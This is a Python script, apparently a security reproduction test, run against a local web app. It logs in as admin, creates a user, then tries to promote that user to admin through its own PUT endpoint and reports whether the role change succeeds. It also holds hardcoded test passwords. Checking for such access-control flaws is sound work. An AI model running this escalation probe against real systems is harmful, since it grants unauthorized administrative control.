import httpx
import asyncio
import sys

BASE_URL = "http://127.0.0.1:8001"

async def reproduce_self_promotion():
    # Use a persistent client to handle cookies
    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
        print("\n--- 0. Setup: Create Test User ---")
        # Login as Admin first
        try:
             res = await client.post("/api/external/auth/login", json={"user_id": "admin", "password": "Admin1234!"})
        except httpx.ConnectError:
             print("Failed to connect.")
             return
             
        if res.status_code == 200 and res.json().get("success") is not False:
             print("Logged in as Admin.")
             # Create user
             new_user = {
                "user_id": "test_user_hacker",
                "first_name": "Test",
                "last_name": "Hacker",
                "role": "user",
                "password": "User1234!",
                "country_value": "US",
                "language": "en"
            }
             res = await client.post("/api/external/users", json=new_user)
             if res.status_code in [200, 201]:
                  print("User 'test_user_hacker' created/exists.")
             else:
                  print(f"Failed to create user: {res.text}")
        else:
             print(f"Failed to login as Admin: {res.text}")
             # Proceed anyway, maybe user exists?

        # Clear cookies to logout admin
        client.cookies.clear()
        
        print("\n--- 1. Login as 'test_user_hacker' ---")
        user_id = "test_user_hacker"
        password = "User1234!" 
        
        res = await client.post("/api/external/auth/login", json={"user_id": user_id, "password": password})

        print(f"Login Response: {res.status_code}")
        print(f"Headers: {res.headers}")
        print(f"Body: {res.text}")
        
        if res.status_code != 200:
            print(f"Login failed: {res.text}")
            return
            
        print(f"Cookies: {client.cookies}")
        
        print("\n--- 2. Attempt Self-Promotion to Admin ---")
        # We are logged in as 'user'. 
        # We send a PUT to our own user endpoint with role='admin'.
        
        update_data = {
            "role": "admin"
        }
        
        res = await client.put(f"/api/external/users/{user_id}", json=update_data)
        
        print(f"Update response: {res.status_code}")
        print(f"Response body: {res.text}")
        
        if res.status_code == 200:
            # Check if role is actually admin now
            # We need to refresh session or get user details
            res = await client.get(f"/api/external/users/{user_id}")
            role = res.json().get("role")
            print(f"New Role: {role}")
            
            if role == "admin":
                 print("\n!!! SECURITY FLAW CONFIRMED: User successfully promoted themselves to Admin! !!!")
            else:
                 print("\nUser update succeeded but role did not change (Backend filtered it?).")
        else:
            print(f"\nUser prevented from self-promotion. Status: {res.status_code}")

if __name__ == "__main__":
    if sys.platform == "win32":
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            pass
    asyncio.run(reproduce_self_promotion())
